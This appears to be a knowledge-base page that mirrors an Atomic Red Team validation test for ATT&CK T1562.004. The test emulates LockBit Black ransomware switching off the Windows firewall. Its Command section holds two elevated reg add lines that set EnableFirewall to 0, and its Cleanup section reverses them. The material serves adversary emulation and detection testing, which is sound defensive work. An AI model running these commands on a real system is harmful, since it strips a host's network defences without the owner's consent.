---
atomic_guid: "a4651931-ebbb-4cde-9363-ddf3d66214cb"
title: "LockBit Black - Unusual Windows firewall registry modification -cmd"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.004"
attack_technique_name: "Impair Defenses: Disable or Modify System Firewall"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "a4651931-ebbb-4cde-9363-ddf3d66214cb"
  - "LockBit Black - Unusual Windows firewall registry modification -cmd"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# LockBit Black - Unusual Windows firewall registry modification -cmd

An adversary tries to modify the windows firewall registry

## Metadata

- Atomic GUID: a4651931-ebbb-4cde-9363-ddf3d66214cb
- Technique: T1562.004: Impair Defenses: Disable or Modify System Firewall
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1562.004/T1562.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.004]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
```

### Cleanup

```commandprompt
reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.yaml)
